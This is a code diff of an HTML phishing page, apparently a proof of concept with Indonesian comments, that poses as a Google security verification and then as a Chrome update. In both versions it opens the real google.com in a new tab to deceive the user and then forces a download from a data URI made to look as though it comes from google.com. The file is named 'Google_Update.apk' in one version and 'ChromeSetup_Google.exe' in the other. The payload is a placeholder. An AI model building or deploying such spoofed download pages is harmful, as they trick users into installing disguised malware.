@@ -1,44 +1,32 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Verification</title>
-    <style>
-        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #fff; margin: 0; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-    </style>
+    <title>Google Security Update</title>
 </head>
-<body>
-
-    <button class="btn" onclick="triggerSeamless()">Verifikasi Perangkat Google</button>
+<body style="font-family: Arial; text-align: center; padding-top: 50px;">
+    <h2>Google Desktop Service</h2>
+    <button id="trigger" style="padding: 15px 30px; cursor: pointer;">Update Chrome Now</button>
 
     <script>
-        function triggerSeamless() {
-            console.log("[*] Inisialisasi serangan...");
+        document.getElementById('trigger').onclick = function() {
+            // Payload Abhishek Kumar versi PC
+            const padding = "B".repeat(250); 
+            const payload = "data://google.com/application/octet-stream;" + padding + ",base64,ZXN0dGVzdGVzdHRlc3Q=";
+            
+            // Trik: Buka Google asli dulu
+            const newWindow = window.open("https://www.google.com", "_blank");
 
-            // 1. Buat Payload (Gunakan Data URI Abhishek Kumar)
-            const padding = "A".repeat(150); 
-            const dataUrl = `data://google.com/html;${padding},base64,ZXN0dGVzdGVzdHRlc3Q=`;
-            const fileName = "Google_Update.apk";
-
-            // 2. Buka Tab Google yang Asli
-            // Ini biar user ngeliat domain "google.com" di address bar mereka
-            window.open("https://www.google.com", "_blank");
-
-            // 3. THE HIJACK: Download ditembak dari tab ini
-            // Kita kasih delay 500ms biar tab Google keburu kebuka duluan
+            // Tembak download setelah tab baru fokus
             setTimeout(() => {
-                const link = document.createElement("a");
-                link.href = dataUrl;
-                link.download = fileName;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
+                const a = document.createElement('a');
+                a.href = payload;
+                a.download = "ChromeSetup_Google.exe"; // Pake .exe biar valuenya tinggi
+                document.body.appendChild(a);
+                a.click();
                 
-                console.log("[+] Download dikirim ke bar notifikasi.");
-            }, 500);
-        }
+                console.log("Payload sent to PC Chrome.");
+            }, 800);
+        };
     </script>
 </body>
 </html>
